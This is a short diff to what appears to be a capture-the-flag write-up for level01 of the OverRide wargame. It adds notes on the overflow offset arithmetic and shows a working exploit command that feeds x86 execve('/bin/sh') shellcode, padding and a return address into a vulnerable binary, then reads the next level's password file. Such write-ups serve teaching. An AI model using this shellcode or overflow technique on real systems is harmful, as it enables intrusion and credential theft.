@@ -1,3 +1,5 @@
+TODO: clean writeup
+
 ## level01
 
 ```console
@@ -42,7 +44,8 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Seems that the return address is overwritten after 80 characters.
 
-TODO: understand why 305 and not 306
+305 and not 306 (-1 because `fgets`)
+255 + 80 - 7 - 23
 
 ```console
 level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc0\x50\x04\x0b\x68//sh\x68/bin\x89\xe3\x31\xc9\x31\xd2\xcd\x80" + "A"*305 + "\x47\xa0\x04\x08"'; echo "cat /home/users/level02/.pass") | ./level01
